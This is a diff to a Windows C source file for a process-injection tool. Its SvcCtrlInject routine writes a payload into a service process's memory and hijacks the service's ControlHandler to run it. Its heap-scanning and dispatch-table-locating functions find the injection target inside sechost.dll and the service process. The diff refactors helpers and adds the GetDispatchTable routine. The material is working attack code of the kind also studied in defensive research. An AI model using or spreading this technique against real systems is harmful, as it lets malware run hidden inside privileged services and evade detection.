@@ -27,38 +27,7 @@
   ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
   POSSIBILITY OF SUCH DAMAGE. */
   
-#define UNICODE
-#pragma warning(disable : 4311)
-#pragma warning(disable : 4312)
-
-#include <Windows.h>
-#include <tlhelp32.h>
-#include <shlwapi.h>
-#include <Winternl.h>
-#include <psapi.h>
-#include <dbghelp.h>
-
-#define UNICODE
-#define _WIN32_DCOM
-
-#include <windows.h>
-#include <Wbemidl.h>
-#include <Shlwapi.h>
-
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <stdlib.h>
-
-#pragma comment(lib, "wbemuuid.lib")
-#pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "oleAut32.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
-
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "dbghelp.lib")
+#include "../ntlib/util.h"
 
 typedef DWORD (WINAPI *RtlCreateUserThread_t)(
     IN HANDLE               ProcessHandle,
@@ -113,127 +82,10 @@ typedef struct _SERVICE_ENTRY {
   HANDLE                  hThread;
 } SERVICE_ENTRY, *PSERVICE_ENTRY;
 
-
-// display error message for last error code
-VOID xstrerror (PWCHAR fmt, ...){
-    PWCHAR  error=NULL;
-    va_list arglist;
-    WCHAR   buffer[1024];
-    DWORD   dwError=GetLastError();
-    
-    va_start(arglist, fmt);
-    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
-    va_end (arglist);
-    
-    if (FormatMessage (
-          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
-          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
-          (LPWSTR)&error, 0, NULL))
-    {
-      wprintf(L"  [ %s : %s\n", buffer, error);
-      LocalFree (error);
-    } else {
-      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
-    }
-}
-
-DWORD name2pid(LPWSTR ImageName) {
-    HANDLE         hSnap;
-    PROCESSENTRY32 pe32;
-    DWORD          dwPid=0;
-    
-    // create snapshot of system
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if(hSnap == INVALID_HANDLE_VALUE) return 0;
-    
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    // get first process
-    if(Process32First(hSnap, &pe32)){
-      do {
-        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
-          dwPid = pe32.th32ProcessID;
-          break;
-        }
-      } while(Process32Next(hSnap, &pe32));
-    }
-    CloseHandle(hSnap);
-    return dwPid;
-}
-
-PWCHAR pid2name(DWORD pid) {
-    HANDLE         hSnap;
-    BOOL           bResult;
-    PROCESSENTRY32 pe32;
-    PWCHAR         name=L"N/A";
-    
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    
-    if (hSnap != INVALID_HANDLE_VALUE) {
-      pe32.dwSize = sizeof(PROCESSENTRY32);
-      
-      bResult = Process32First(hSnap, &pe32);
-      while (bResult) {
-        if (pe32.th32ProcessID == pid) {
-          name = pe32.szExeFile;
-          break;
-        }
-        bResult = Process32Next(hSnap, &pe32);
-      }
-      CloseHandle(hSnap);
-    }
-    return name;
-}
-
-// enable or disable a privilege in current process token
-BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
-    HANDLE           hToken;
-    BOOL             bResult;
-    LUID             luid;
-    TOKEN_PRIVILEGES tp;
-
-    // open token for current process
-    bResult = OpenProcessToken(GetCurrentProcess(),
-      TOKEN_ADJUST_PRIVILEGES, &hToken);
-    
-    if(!bResult)return FALSE;
-    
-    // lookup privilege
-    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
-    if(bResult){
-      tp.PrivilegeCount           = 1;
-      tp.Privileges[0].Luid       = luid;
-      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;
-
-      // adjust token
-      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
-    }
-    CloseHandle(hToken);
-    return bResult;
-}
-
-#if !defined (__GNUC__)
-/**
- *
- * Returns TRUE if process token is elevated
- *
- */
-BOOL IsElevated(VOID) {
-    HANDLE          hToken;
-    BOOL            bResult = FALSE;
-    TOKEN_ELEVATION te;
-    DWORD           dwSize;
-      
-    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-      if (GetTokenInformation (hToken, TokenElevation, &te,
-          sizeof(TOKEN_ELEVATION), &dwSize)) {
-        bResult = te.TokenIsElevated;
-      }
-      CloseHandle(hToken);
-    }
-    return bResult;
-}
-#endif
+typedef struct _INTERNAL_DISPATCH_TABLE {
+    LIST_ENTRY              DispatchEntryHead;
+    INTERNAL_DISPATCH_ENTRY DispatchEntry;
+} INTERNAL_DISPATCH_TABLE, *PINTERNAL_DISPATCH_TABLE;
 
 BOOL StopService(PSERVICE_ENTRY se){
     DWORD                   evt;
@@ -305,7 +157,7 @@ VOID SvcCtrlInject(PSERVICE_ENTRY se, LPVOID payload, DWORD payloadSize) {
             // write payload to process space
             WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
             // create backup of IDE
-            CopyMemory(&ide, &se->ide, sizeof(ide));
+            memcpy(&ide, &se->ide, sizeof(ide));
             // point ControlHandler to payload
             ide.ControlHandler = cs;
             // change flags
@@ -646,7 +498,7 @@ BOOL GetServiceIDE(PSERVICE_ENTRY ste) {
       printf("Unable to obtain service information.\n");
       ste->pid = name2pid(ste->service);
       if(ste->pid == 0) {
-        ste->pid = _wtoi(ste->service);
+        ste->pid = wcstoull(ste->service, NULL, 10);
         if(ste->pid == 0) {
           printf("Unable to obtain process id.\n");
           return FALSE;
@@ -669,8 +521,8 @@ BOOL GetServiceIDE(PSERVICE_ENTRY ste) {
         res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
 
         // we only want to scan the heap, but this will scan stack space too.
-        if ((mbi.State == MEM_COMMIT)  &&
-            (mbi.Type  == MEM_PRIVATE) && 
+        if ((mbi.State   == MEM_COMMIT)  &&
+            (mbi.Type    == MEM_PRIVATE) && 
             (mbi.Protect == PAGE_READWRITE)) 
         {
           bFound = FindServiceIDE(hProcess, 
@@ -684,24 +536,58 @@ BOOL GetServiceIDE(PSERVICE_ENTRY ste) {
     return bFound;
 }
 
-DWORD readpic(PWCHAR path, LPVOID *pic){
-    HANDLE hf;
-    DWORD  len,rd=0;
+// this is never called. just an address to compare with
+int WINAPI ServiceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
+  return dwNumServicesArgs * 4;
+}
+
+LPVOID GetDispatchTable(VOID) {
+    LPVOID                   m, va = NULL;
+    PIMAGE_DOS_HEADER        dos;
+    PIMAGE_NT_HEADERS        nt;
+    PIMAGE_SECTION_HEADER    sh;
+    DWORD                    i, cnt;
+    PULONG_PTR               ds;
+    PINTERNAL_DISPATCH_TABLE dt;
     
-    // 1. open the file
-    hf = CreateFile(path, GENERIC_READ, 0, 0,
-      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-      
-    if(hf != INVALID_HANDLE_VALUE){
-      // get file size
-      len = GetFileSize(hf, 0);
-      // allocate memory
-      *pic = malloc(len + 16);
-      // read file contents into memory
-      ReadFile(hf, *pic, len, &rd, 0);
-      CloseHandle(hf);
+    // fake service 
+    SERVICE_TABLE_ENTRY svcTable[] = {
+      { L"", ServiceMain },
+      { NULL, NULL }};
+    
+    // this will create the dispatch table but won't execute ServiceMain
+    StartServiceCtrlDispatcher(svcTable);
+    
+    // now search the .data segment of sechost.dll for the table
+    m   = GetModuleHandle(L"sechost.dll");
+    dos = (PIMAGE_DOS_HEADER)m;  
+    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
+    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+          nt->FileHeader.SizeOfOptionalHeader);
+          
+    // locate the .data segment, save VA and number of pointers
+    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
+      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
+        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
+        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
+        break;
+      }
     }
-    return rd;
+    // for each pointer
+    for(i=0; i<cnt; i++) {
+      // not a heap pointer? skip it
+      if(!IsHeapPtr((LPVOID)ds[i])) continue;
+      
+      dt = (PINTERNAL_DISPATCH_TABLE)ds[i];
+
+      // contains our function?
+      if(dt->DispatchEntry.ServiceStartRoutine == (LPVOID)ServiceMain) {
+        // return RVA of dispatch table
+        va = (LPVOID)((PBYTE)&ds[i] - (PBYTE)m);
+        break;
+      }
+    }
+    return va;
 }
 
 VOID usage(VOID){
@@ -741,7 +627,7 @@ int main(void) {
             pfile = argv[++i];
             break;
           case L't':
-            thread = _wtoi(argv[++i]);
+            thread = wcstoull(argv[++i], NULL, 10);
             break;
           case L'?':
           case L'h':
